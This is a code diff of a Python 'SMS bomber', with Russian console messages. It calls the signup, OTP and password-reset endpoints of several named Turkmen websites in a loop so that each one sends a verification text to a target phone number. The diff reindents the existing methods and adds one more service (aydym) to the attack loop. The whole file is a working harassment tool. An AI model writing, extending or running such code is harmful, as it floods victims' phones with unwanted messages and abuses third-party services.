@@ -12,85 +12,95 @@ from threading import Thread
 
 class Sites:
 	
-    def belet(self, phone):
-        r = post("https://api.belet.me/api/v1/auth/sign-in",
+	def belet(self, phone):
+		r = post("https://api.belet.me/api/v1/auth/sign-in",
 		json = {"phone":phone,"fingerprint":"110aec2bfcca53e0793f5973e5b86926"})
 
-        if r.status_code == 200:
-            print(Fore.GREEN + "[Belet] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[Belet] Ошибка: Код {r.status_code}")
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Belet] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Belet] Ошибка: Код {r.status_code}")
 
 
-    def gipertm(self, phone):
-        r = post("https://gipertm.com/api/v1/profile/register",
-        json = {"lang":"tk", "username":str(phone)})
+	def gipertm(self, phone):
+		r = post("https://gipertm.com/api/v1/profile/register",
+		json = {"lang":"tk", "username":str(phone)})
 
-        if r.status_code == 200:
-            print(Fore.GREEN + "[GiperTm] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[GiperTm] Ошибка: Код {r.status_code}")
-
-
-    def asman_express(self, phone):
-        r = post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register",
-        json = {"phone":str(phone)})
-
-        if r.status_code == 200:
-            print(Fore.GREEN + "[Asman Express] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[Asman Express] Ошибка: Код {r.status_code}")
+		if r.status_code == 200:
+			print(Fore.GREEN + "[GiperTm] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[GiperTm] Ошибка: Код {r.status_code}")
 
 
-    def nesipetsin(self, phone):
-        r = post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
-        json = {"method":"phone","step":1,"phone":str(phone)[3:],"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})
+	def asman_express(self, phone):
+		r = post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register",
+		json = {"phone":str(phone)})
 
-        if r.status_code == 200:
-            print(Fore.GREEN + "[Nesip Etsin] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[Nesip Etsin] Ошибка: Код {r.status_code}")
-
-
-    def saraytm(self, phone):
-        r = get("https://saray.tm/verify?phone=" + str(phone)[3:] + "&terms=accept")
-
-        if r.status_code == 200:
-            print(Fore.GREEN + "[SarayTm] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[SarayTm] Ошибка: Код {r.status_code}")
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Asman Express] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Asman Express] Ошибка: Код {r.status_code}")
 
 
-    def awtoyoly(self, phone):
-        r = post("http://awtoyoly.com.tm/Client/AwtoCheckLogin",
-        data = {"phone":str(phone)[3:]})
+	def nesipetsin(self, phone):
+		r = post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
+		json = {"method":"phone","step":1,"phone":str(phone)[3:],"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})
 
-        if r.status_code == 200:
-            print(Fore.GREEN + "[Awtoyoly] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[Awtoyoly] Ошибка: Код {r.status_code}")
-
-
-
-    def ynamdar(self, phone):
-        r = post("https://ynamdar.com/v3/forgot_password",
-        data = {"registration-type": "phone", "phone": str(phone)[3:], "action": "send-confirmation-code"})
-
-        if r.status_code == 200:
-            print(Fore.GREEN + "[Ynamdar] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[Ynamdar] Ошибка: Код {r.status_code}")
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Nesip Etsin] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Nesip Etsin] Ошибка: Код {r.status_code}")
 
 
-    def markayoly(self, phone):
-        r = post("https://api.markayoly.com/api/start-signup",
-        json = {"phone":str(phone)[3:]})
+	def saraytm(self, phone):
+		r = get("https://saray.tm/verify?phone=" + str(phone)[3:] + "&terms=accept")
 
-        if r.status_code == 200:
-            print(Fore.GREEN + "[Markayoly] Сообщение отправлено.")
-        else:
-            print(Fore.RED + f"[Markayoly] Ошибка: Код {r.status_code}")
-            
+		if r.status_code == 200:
+			print(Fore.GREEN + "[SarayTm] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[SarayTm] Ошибка: Код {r.status_code}")
+
+
+	def awtoyoly(self, phone):
+		r = post("http://awtoyoly.com.tm/Client/AwtoCheckLogin",
+		data = {"phone":str(phone)[3:]})
+
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Awtoyoly] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Awtoyoly] Ошибка: Код {r.status_code}")
+
+
+
+	def ynamdar(self, phone):
+		r = post("https://ynamdar.com/v3/forgot_password",
+		data = {"registration-type": "phone", "phone": str(phone)[3:], "action": "send-confirmation-code"})
+
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Ynamdar] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Ynamdar] Ошибка: Код {r.status_code}")
+
+
+	def markayoly(self, phone):
+		r = post("https://api.markayoly.com/api/start-signup",
+		json = {"phone":str(phone)[3:]})
+
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Markayoly] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Markayoly] Ошибка: Код {r.status_code}")
+
+
+	def aydym(self, phone):
+		r = post("https://aydym.com/api/v1/profile/register",
+		json = {"username": str(phone), "owner": "web-aa3b6254-3e4e-4d88-ad44-5853d68e2c9f"})
+
+		if r.status_code == 200:
+			print(Fore.GREEN + "[Aydym] Сообщение отправлено.")
+		else:
+			print(Fore.RED + f"[Aydym] Ошибка: Код {r.status_code}")
+			
 
 class Spammer(Sites):
 
@@ -117,6 +127,8 @@ class Spammer(Sites):
 			self.awtoyoly(phone)
 			self.ynamdar(phone)
 			self.markayoly(phone)
+			self.aydym(phone)
+	 
 		except TooManyRedirects:
 			print("Слишком много запросов, беру отдых...")
 			sleep(10)
@@ -166,4 +178,4 @@ if __name__ == "__main__":
 
 	Spammer = Spammer(phone, tries)
 	Spammer.attack()
-	input()
+	input("Нажмите чтобы выйти ")
